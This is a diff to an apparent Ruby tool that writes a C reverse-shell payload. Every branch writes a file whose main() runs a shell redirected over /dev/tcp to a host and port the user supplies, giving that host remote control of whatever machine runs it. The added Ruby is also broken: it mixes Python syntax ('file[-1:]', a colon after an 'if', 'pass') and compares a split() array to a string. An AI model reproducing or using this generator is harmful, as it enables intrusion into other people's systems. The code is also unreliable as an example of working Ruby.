@@ -51,19 +51,68 @@ if host == "" or port == "" or shell == "" or file == ""
     puts "  --output-file=<output_file>    Output file."
 end
   
-begin
-    sleep(0.5)
-    puts "#{g}Generating payload..."
-    sleep(1)
-    puts "#{g}Saving to #{file}..."
-    sleep(0.5)
-    open(file, 'w') { |f|
-        f.puts "#include <stdio.h>"
-        f.puts "int main() {"
-        f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
-        f.puts "}"
-    }
-    puts "#{s}Saved to #{file}!"
-rescue
-    puts "#{e}Failed to generate payload!"
+if File.directory? file
+    if File.exists? file
+        if file[-1:] == "/":
+            file = "#{file}payload.c"
+            sleep(0.5)
+            puts "#{g}Generating payload..."
+            sleep(1)
+            puts "#{g}Saving to #{file}..."
+            sleep(0.5)
+            open(file, 'w') { |f|
+                f.puts "#include <stdio.h>"
+                f.puts "int main() {"
+                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "}"
+            }
+            puts "#{s}Saved to #{file}!"
+        else
+            file = "#{file}/payload.c"
+            sleep(0.5)
+            puts "#{g}Generating payload..."
+            sleep(1)
+            puts "#{g}Saving to #{file}..."
+            sleep(0.5)
+            open(file, 'w') { |f|
+                f.puts "#include <stdio.h>"
+                f.puts "int main() {"
+                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "}"
+            }
+            puts "#{s}Saved to #{file}!"
+        end
+    else
+        puts "#{e}Local directory: #{file}: does not exist!"
+        abort()
+    end
+else
+    direct = file.split(File::SEPARATOR)
+    if direct == ""
+        direct = "."
+    else
+        pass
+    end
+    if File.exists? direct
+        if File.directory? direct
+            sleep(0.5)
+            puts "#{g}Generating payload..."
+            sleep(1)
+            puts "#{g}Saving to #{file}..."
+            sleep(0.5)
+            open(file, 'w') { |f|
+                f.puts "#include <stdio.h>"
+                f.puts "int main() {"
+                f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+                f.puts "}"
+            }
+            puts "#{s}Saved to #{file}!"
+        else
+            puts "#{e}Error: #{direct}: not a directory!"
+            abort()
+        end
+    else
+        puts "#{e}Local directory: #{direct}: does not exist!"
+        abort()
+    end
 end
